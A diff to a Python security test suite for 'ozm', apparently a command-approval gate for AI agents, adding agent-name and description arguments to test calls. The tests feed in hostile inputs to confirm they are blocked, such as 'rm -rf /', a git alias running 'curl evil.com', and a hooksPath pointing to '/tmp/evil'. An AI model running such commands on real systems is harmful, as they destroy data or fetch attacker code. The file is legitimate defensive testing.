@@ -17,6 +17,11 @@ from ozm import git as git_mod
 from ozm import install as install_mod
 from ozm.approve import ApprovalResult, _escape, _strip_unicode_control
 
+META = [
+    "--agent-name", "Security test",
+    "--agent-description", "Exercise security validation behavior.",
+]
+
 
 # ---------------------------------------------------------------------------
 # H1: Shell metacharacters rejected from allowlist fast-path
@@ -109,7 +114,7 @@ class TestH2EditedCommandRecheck(unittest.TestCase):
              patch.object(cmd_mod, "request_cmd_approval", return_value=ApprovalResult(
                  approved=True, command="rm -rf /")), \
              patch.object(cmd_mod, "audit_log"):
-            result = CliRunner().invoke(cmd_mod.cmd_cmd, ["echo", "hello"])
+            result = CliRunner().invoke(cmd_mod.cmd_cmd, [*META, "echo", "hello"])
 
         self.assertNotEqual(result.exit_code, 0)
         self.assertIn("blocked", result.output)
@@ -123,7 +128,7 @@ class TestH2EditedCommandRecheck(unittest.TestCase):
                  approved=True, command="sed -i '' s/a/b/ README.md")), \
              patch.object(cmd_mod, "subprocess") as mock_sub, \
              patch.object(cmd_mod, "audit_log"):
-            result = CliRunner().invoke(cmd_mod.cmd_cmd, ["echo", "hello"])
+            result = CliRunner().invoke(cmd_mod.cmd_cmd, [*META, "echo", "hello"])
 
         self.assertNotEqual(result.exit_code, 0)
         self.assertIn("blocked command 'sed'", result.output)
@@ -142,7 +147,7 @@ class TestH2EditedCommandRecheck(unittest.TestCase):
              patch.object(cmd_mod, "subprocess") as mock_sub, \
              patch.object(cmd_mod, "audit_log"):
             mock_sub.run.return_value = completed
-            result = CliRunner().invoke(cmd_mod.cmd_cmd, ["echo", "hello"])
+            result = CliRunner().invoke(cmd_mod.cmd_cmd, [*META, "echo", "hello"])
 
         self.assertEqual(result.exit_code, 0)
 
@@ -269,7 +274,7 @@ class TestM2DangerousSubcommands(unittest.TestCase):
             mock_handle.side_effect = SystemExit(1)
             mock_sub.run.return_value = subprocess.CompletedProcess([], 0)
             result = runner.invoke(
-                git_mod.git_cmd, ["config", "alias.x", "!curl evil.com"]
+                git_mod.git_cmd, [*META, "config", "alias.x", "!curl evil.com"]
             )
         mock_handle.assert_called_once()
         self.assertIn("alias.", mock_handle.call_args[0][0])
@@ -281,7 +286,7 @@ class TestM2DangerousSubcommands(unittest.TestCase):
             mock_handle.side_effect = SystemExit(1)
             mock_sub.run.return_value = subprocess.CompletedProcess([], 0)
             result = runner.invoke(
-                git_mod.git_cmd, ["config", "core.hooksPath", "/tmp/evil"]
+                git_mod.git_cmd, [*META, "config", "core.hooksPath", "/tmp/evil"]
             )
         mock_handle.assert_called_once()
         self.assertIn("core.hooksPath", mock_handle.call_args[0][0])
@@ -292,7 +297,7 @@ class TestM2DangerousSubcommands(unittest.TestCase):
              patch.object(git_mod, "subprocess") as mock_sub:
             mock_sub.run.return_value = subprocess.CompletedProcess([], 0)
             result = runner.invoke(
-                git_mod.git_cmd, ["config", "user.name", "Test"]
+                git_mod.git_cmd, [*META, "config", "user.name", "Test"]
             )
         mock_handle.assert_not_called()
 
@@ -370,7 +375,10 @@ class TestHookParserRegression(unittest.TestCase):
         self.assertIn("deny", result.stdout)
 
     def test_ozm_command_allowed(self):
-        result = self._run_hook("ozm run script.py")
+        result = self._run_hook(
+            'ozm run --agent-name "Run script" '
+            '--agent-description "Execute a reviewed script." script.py'
+        )
         self.assertEqual(result.stdout.strip(), "")
 
     def test_safe_echo_allowed(self):
@@ -394,7 +402,11 @@ class TestHookParserRegression(unittest.TestCase):
         self.assertIn("deny", result.stdout)
 
     def test_quoted_semicolon_inside_ozm_command_allowed(self):
-        result = self._run_hook('ozm cmd python3 -c "print(1); print(2)"')
+        result = self._run_hook(
+            'ozm cmd --agent-name "Run one-liner" '
+            '--agent-description "Execute a Python one-liner." '
+            'python3 -c "print(1); print(2)"'
+        )
         self.assertEqual(result.stdout.strip(), "")
 
 
